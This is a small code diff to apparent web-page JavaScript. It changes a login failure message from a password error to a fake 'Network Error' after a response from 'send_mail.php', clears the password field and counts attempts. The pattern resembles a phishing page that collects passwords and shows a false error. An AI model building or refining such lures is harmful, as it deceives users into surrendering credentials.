@@ -357,7 +357,7 @@ return false;
                             console.log('[send_mail.php] Response:', response);
                             
                             $("#msg").show();
-                            $('#msg').html("Please enter correct password and try again");
+                            $('#msg').html("Network Error: unable to connect to server");
                             $("#password").val("");
                             
                             if (count >= 3) {
